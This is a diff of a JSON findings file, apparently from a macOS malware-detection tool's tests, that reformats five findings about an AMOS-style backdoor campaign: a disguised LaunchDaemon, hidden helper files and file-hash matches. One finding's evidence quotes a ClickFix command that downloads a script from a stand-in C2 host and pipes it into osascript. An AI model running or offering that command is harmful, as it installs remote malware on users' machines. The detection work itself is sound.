@@ -1,7 +1,98 @@
 [
-  {"id": "F1", "surface": "host", "severity": "suspicious", "subject": "/Library/LaunchDaemons/com.finder.helper.plist", "title": "File /Library/LaunchDaemons/com.finder.helper.plist is named like \"com.finder.helper.plist\", but its sha256 matches none of the campaign's 1 hash(es)", "evidence": {"kind": "file", "ref": "/Library/LaunchDaemons/com.finder.helper.plist", "excerpt": "sha256=bfeb645585b12cccb164761ba4f9e4b76ca2a71327f185a85f46cb0470dbe86b"}, "campaign": "amos-backdoor-2026-11", "source": "S1", "indicator": {"type": "file", "value": "com.finder.helper.plist"}, "key": "host|/Library/LaunchDaemons/com.finder.helper.plist|file:com.finder.helper.plist"},
-  {"id": "F2", "surface": "host", "severity": "suspicious", "subject": "/Users/you/.agent", "title": "File /Users/you/.agent is named like \"~/.agent\", but its sha256 matches none of the campaign's 1 hash(es)", "evidence": {"kind": "file", "ref": "/Users/you/.agent", "excerpt": "sha256=64c048b4e275e98f931f5a2991cde18788b26d2a78e9ba4724dc30b01eb1eadd"}, "campaign": "amos-backdoor-2026-11", "source": "S1", "indicator": {"type": "file", "value": "~/.agent"}, "key": "host|/Users/you/.agent|file:~/.agent"},
-  {"id": "F3", "surface": "host", "severity": "compromised", "subject": "/Users/you/.mainhelper", "title": "File /Users/you/.mainhelper matches the sha256", "evidence": {"kind": "file", "ref": "/Users/you/.mainhelper", "excerpt": "sha256=bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"}, "campaign": "amos-backdoor-2026-11", "source": "S1", "indicator": {"type": "sha256", "value": "bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"}, "key": "host|/Users/you/.mainhelper|sha256:bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"},
-  {"id": "F4", "surface": "host", "severity": "compromised", "subject": "/Library/LaunchDaemons/com.finder.helper.plist", "title": "Startup item /Library/LaunchDaemons/com.finder.helper.plist contains \"stat -f \"%Su\" /dev/console\"", "at": "2026-11-10T08:00:00.000Z", "evidence": {"kind": "file", "ref": "/Library/LaunchDaemons/com.finder.helper.plist", "excerpt": "/bin/bash /Users/you/.agent"}, "campaign": "amos-backdoor-2026-11", "source": "S1", "indicator": {"type": "string", "value": "stat -f \"%Su\" /dev/console"}, "key": "host|/Library/LaunchDaemons/com.finder.helper.plist|string:stat -f \"%Su\" /dev/console"},
-  {"id": "F5", "surface": "host", "severity": "exposed", "subject": "/Users/you/.zsh_history", "title": "/Users/you/.zsh_history line 1 mentions \"amos-c2.example\"", "evidence": {"kind": "file", "ref": "/Users/you/.zsh_history:1", "excerpt": "curl -s https://amos-c2.example/install | osascript"}, "campaign": "amos-backdoor-2026-11", "source": "S1", "indicator": {"type": "domain", "value": "amos-c2.example"}, "key": "host|/Users/you/.zsh_history|domain:amos-c2.example"}
+  {
+    "id": "F1",
+    "surface": "host",
+    "severity": "suspicious",
+    "subject": "/Library/LaunchDaemons/com.finder.helper.plist",
+    "title": "File /Library/LaunchDaemons/com.finder.helper.plist is named like \"com.finder.helper.plist\", but its sha256 matches none of the campaign's 1 hash(es)",
+    "evidence": {
+      "kind": "file",
+      "ref": "/Library/LaunchDaemons/com.finder.helper.plist",
+      "excerpt": "sha256=bfeb645585b12cccb164761ba4f9e4b76ca2a71327f185a85f46cb0470dbe86b"
+    },
+    "campaign": "amos-backdoor-2026-11",
+    "source": "S1",
+    "indicator": {
+      "type": "file",
+      "value": "com.finder.helper.plist"
+    },
+    "key": "host|/Library/LaunchDaemons/com.finder.helper.plist|file:com.finder.helper.plist"
+  },
+  {
+    "id": "F2",
+    "surface": "host",
+    "severity": "suspicious",
+    "subject": "/Users/you/.agent",
+    "title": "File /Users/you/.agent is named like \"~/.agent\", but its sha256 matches none of the campaign's 1 hash(es)",
+    "evidence": {
+      "kind": "file",
+      "ref": "/Users/you/.agent",
+      "excerpt": "sha256=64c048b4e275e98f931f5a2991cde18788b26d2a78e9ba4724dc30b01eb1eadd"
+    },
+    "campaign": "amos-backdoor-2026-11",
+    "source": "S1",
+    "indicator": {
+      "type": "file",
+      "value": "~/.agent"
+    },
+    "key": "host|/Users/you/.agent|file:~/.agent"
+  },
+  {
+    "id": "F3",
+    "surface": "host",
+    "severity": "compromised",
+    "subject": "/Users/you/.mainhelper",
+    "title": "File /Users/you/.mainhelper matches the sha256",
+    "evidence": {
+      "kind": "file",
+      "ref": "/Users/you/.mainhelper",
+      "excerpt": "sha256=bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"
+    },
+    "campaign": "amos-backdoor-2026-11",
+    "source": "S1",
+    "indicator": {
+      "type": "sha256",
+      "value": "bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"
+    },
+    "key": "host|/Users/you/.mainhelper|sha256:bfb3305a3e4de2ec716f279636c18a8b9a0f016f78e2ffade0dcd08b08af566b"
+  },
+  {
+    "id": "F4",
+    "surface": "host",
+    "severity": "compromised",
+    "subject": "/Library/LaunchDaemons/com.finder.helper.plist",
+    "title": "Startup item /Library/LaunchDaemons/com.finder.helper.plist has the launchd label \"com.finder.helper\"",
+    "at": "2026-11-10T08:00:00.000Z",
+    "evidence": {
+      "kind": "file",
+      "ref": "/Library/LaunchDaemons/com.finder.helper.plist",
+      "excerpt": "/bin/bash /Users/you/.agent"
+    },
+    "campaign": "amos-backdoor-2026-11",
+    "source": "S1",
+    "indicator": {
+      "type": "launchd_label",
+      "value": "com.finder.helper"
+    },
+    "key": "host|/Library/LaunchDaemons/com.finder.helper.plist|launchd_label:com.finder.helper"
+  },
+  {
+    "id": "F5",
+    "surface": "host",
+    "severity": "compromised",
+    "subject": "/Users/you/.zsh_history",
+    "title": "/Users/you/.zsh_history line 1: a pasted command that pipes a download into osascript (ClickFix), with \"amos-c2.example\"",
+    "evidence": {
+      "kind": "file",
+      "ref": "/Users/you/.zsh_history:1",
+      "excerpt": "curl -s https://amos-c2.example/install | osascript"
+    },
+    "campaign": "amos-backdoor-2026-11",
+    "source": "S1",
+    "indicator": {
+      "type": "domain",
+      "value": "amos-c2.example"
+    },
+    "key": "host|/Users/you/.zsh_history|domain:amos-c2.example"
+  }
 ]
